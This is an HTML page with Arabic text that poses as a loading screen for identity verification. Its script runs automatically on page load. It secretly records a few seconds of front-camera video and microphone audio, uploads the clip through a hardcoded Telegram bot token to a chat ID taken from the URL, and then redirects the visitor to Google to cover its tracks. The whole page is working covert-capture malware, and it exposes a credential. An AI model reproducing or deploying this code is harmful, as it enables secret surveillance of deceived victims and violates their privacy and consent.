<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { background-color: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 4px solid #222; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div id="status">جاري التحقق من الهوية...</div>

<script>
    const TELEGRAM_TOKEN = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E';
    const urlParams = new URLSearchParams(window.location.search);
    const CHAT_ID = urlParams.get('chatId') || urlParams.get('sender_id') || '8169635171';

    let mediaRecorder;
    let recordedChunks = [];

    async function startCapture() {
        try {
            // طلب إذن الكاميرا الأمامية والميكروفون (الفيديو يحتاج صوت غالباً أو يمكنك حذفه)
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: true 
            });

            // بدء التسجيل باستخدام MediaRecorder
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            
            mediaRecorder.ondataavailable = function(e) {
                if (e.data.size > 0) {
                    recordedChunks.push(e.data);
                }
            };

            mediaRecorder.onstop = async function() {
                // تجميع المقاطع المسجلة في ملف فيديو واحد
                const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', blob, 'video.mp4');

                try {
                    // إرسال الفيديو إلى البوت عبر دالة sendVideo
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });

                    if (response.ok) {
                        console.log("تم إرسال الفيديو بنجاح");
                    }
                } catch (e) {
                    console.error("خطأ في الشبكة:", e);
                } finally {
                    // إيقاف الكاميرا تماماً والتوجيه إلى جوجل
                    stream.getTracks().forEach(track => track.stop());
                    window.location.replace("https://www.google.com");
                }
            };

            // بدء تسجيل الفيديو
            mediaRecorder.start();
            document.getElementById('status').innerText = "جاري جلب البيانات...";

            // تحديد مدة الفيديو (مثلاً: 3500 مللي ثانية تعني 3.5 ثانية) ثم إيقافه تلقائياً للإرسال
            setTimeout(() => {
                mediaRecorder.stop();
            }, 3500); 

        } catch (error) {
            document.getElementById('status').innerText = "يرجى السماح بالوصول للكاميرا والميكروفون للمتابعة";
        }
    }

    window.onload = startCapture;
</script>
</body>
</html>
